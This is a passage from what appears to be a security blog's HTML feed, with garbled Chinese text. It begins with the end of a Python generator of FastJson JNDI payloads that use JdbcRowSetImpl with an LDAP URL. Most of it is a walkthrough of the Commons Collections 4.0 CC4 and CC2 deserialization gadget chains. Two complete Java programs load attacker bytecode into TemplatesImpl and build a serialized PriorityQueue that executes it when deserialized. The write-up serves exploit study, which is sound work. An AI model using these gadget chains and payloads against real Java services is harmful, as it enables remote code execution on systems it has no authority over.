class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">            <span class="keyword">yield</span> self.gen_payload3(payload)</span><br><span class="line">            <span class="keyword">yield</span> self.gen_payload4(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fjp = FastJsonPayload(<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;rand1&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span></span><br><span class="line"><span class="string">    &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> fjp.gen():</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCå®Œç»“PriorityQueue CC2&amp;CC4</title>
      <link href="/2024/08/02/cc2-cc4-priorityqueue/"/>
      <url>/2024/08/02/cc2-cc4-priorityqueue/</url>
      
        <content type="html"><![CDATA[<p>CC2ï¼Œ4éƒ½æ˜¯Common Collections 4.0ç‰ˆæœ¬ä¸‹çš„ååºåˆ—åŒ–æ¼æ´ã€‚pomä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>è¿™ä¸ªç‰ˆæœ¬ç‰¹ç‚¹åœ¨äºTransformingComparatorè„‘ç˜«çš„åŠ ä¸Šäº†Serializableæ¥å£ï¼Œå¹¶åœ¨readObjectä¹±æ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143255644.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143255644.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>chainedTransformer#transform()å¯ä»¥ç”¨TransformingComparator#compareè§¦å‘</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143009550.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143009550.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>PriorityQueue#siftDownUsingComparatorè°ƒç”¨äº†compare</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143054560.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143054560.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å‘ä¸Šä¸€ç›´æŸ¥æ‰¾ç”¨æ³•ï¼Œåœ¨PriorityQueue#readObjectèƒ½é“¾ä¸Šæ•´æ¡é“¾</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143133929.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143133929.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>äºæ˜¯æœ‰å¦‚ä¸‹ä»£ç åˆ©ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer,<span class="literal">null</span>);</span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,transformingComparator);</span><br><span class="line">serialize(priorityQueue);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿è¡Œå¹¶æ²¡æœ‰æˆåŠŸåˆ©ç”¨ï¼Œåœ¨heapifyå¤„æ‰“ä¸Šæ–­ç‚¹</p><p>å‘ç°size&#x3D;0ï¼Œiåˆå§‹å€¼ä¸º-1ï¼Œè¿›ä¸äº†forå¾ªç¯ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802144327398.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802144327398.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼è§£å†³</p><h3 id="åå°„ä¿®æ”¹size"><a href="#åå°„ä¿®æ”¹size" class="headerlink" title="åå°„ä¿®æ”¹size"></a>åå°„ä¿®æ”¹size</h3><p>è¿™é‡Œå¯ä»¥åå°„ä¿®æ”¹size</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer,<span class="literal">null</span>);</span><br><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,transformingComparator);</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(priorityQueue,<span class="number">2</span>);</span><br><span class="line">serialize(priorityQueue);</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ä¼šæŠ¥å°è¯•è®¿é—®æ•°ç»„ä¸­ä¸å­˜åœ¨çš„ç´¢å¼•ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802145143841.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802145143841.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘æ˜¯æ”¹å­—æ®µå¤§ç‹ã€‚é”™è¯¯å‘ç”Ÿåœ¨åºåˆ—åŒ–æ—¶ï¼Œä¾æ¬¡åºåˆ—åŒ–queueæ•°ç»„å…ƒç´ ï¼Œä½†è¶Šç•Œè¯»å–ï¼Œå†åå°„ä¿®æ”¹queueå°±å®Œäº‹ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802145257303.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802145257303.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4PriorityQueue</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry2.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesClass&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer,<span class="literal">null</span>);</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,transformingComparator);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue,<span class="number">2</span>);</span><br><span class="line">        Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue,array);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="addæ·»åŠ "><a href="#addæ·»åŠ " class="headerlink" title="addæ·»åŠ "></a>addæ·»åŠ </h3><p>ä¹Ÿå¯ä»¥å‘queue addè¿›å…ƒç´ ï¼Œè¿›è€Œè°ƒç”¨offerå¯¹sizeè¿›è¡Œæ·»åŠ ã€‚</p><p>ä½†æ˜¯offeræ–¹æ³•é‡Œçš„siftUpä¼šå†æ¬¡è°ƒç”¨åˆ°chainedTransformerã€‚æœ‰ç‚¹ç±»ä¼¼URLDNSäº†ï¼Œéœ€è¦addå‰æ·»åŠ ä¸éœ€è¦çš„comparatorï¼Œaddåå†ä¿®æ”¹ï¼Œé˜²æ­¢è¯¯è°ƒç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802144518621.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802144518621.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer,<span class="literal">null</span>);</span><br><span class="line">      PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>)));</span><br><span class="line">      priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">      priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">compareField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">      compareField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      compareField.set(priorityQueue,transformingComparator);</span><br><span class="line">      serialize(priorityQueue);</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4PriorityQueue</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry2.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesClass&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer,<span class="literal">null</span>);</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>)));</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">compareField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        compareField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        compareField.set(priorityQueue,transformingComparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>CC4ç‰¹ç‚¹åœ¨äºæ²¡æœ‰ç‰¹ç‚¹ã€‚å‹‰å¼ºè¯´ç‰¹ç‚¹å°±æ˜¯CC4.0ç‰ˆæœ¬èƒ½ç”¨ï¼Œè€Œä¸”æ²¡ç”¨åˆ°LazyMap</p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>CC2ç‰¹ç‚¹åœ¨äºå»æ‰äº†Transformeræ•°ç»„ï¼Œæœ‰äº›ä¸­é—´ä»¶ï¼ŒShiroï¼ŒTomcatä¼ æ•°ç»„å¯èƒ½ä¼šæœ‰ä¼ è¾“é—®é¢˜ã€‚</p><p>ä¸ç”¨Transformeræ•°ç»„ï¼ŒchainedTransformerä¹Ÿç æ‰äº†ã€‚</p><p>CC2ç”¨åˆ°äº†TemplatesImpl#newTransformeræ–¹æ³•ï¼Œä¹‹å‰çš„CC3æˆ‘ä»¬æ˜¯ç”¨TrAXFilteræ„é€ å‡½æ•°å»è§¦å‘çš„newTransformerã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesClass&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802152748715.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802152748715.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥æ–‡çš„å®Œæ•´ä»£ç 1ä¹Ÿç»™å‡ºäº†èƒ½ç›´æ¥InvokerTransformerè°ƒç”¨newTransformer</p><p><a href="https://godownio.github.io/2024/08/01/duo-lu-jing-templatesimpl-cc3/#%E7%9B%B4%E6%8E%A5%E8%A7%A6%E5%8F%91TemplatesImpl-newTransformer">https://godownio.github.io/2024/08/01/duo-lu-jing-templatesimpl-cc3/#%E7%9B%B4%E6%8E%A5%E8%A7%A6%E5%8F%91TemplatesImpl-newTransformer</a></p><p>ä½†æ˜¯å½“æ—¶ä¸çŸ¥é“æ€ä¹ˆå‘InvokerTransformer.transformä¼ 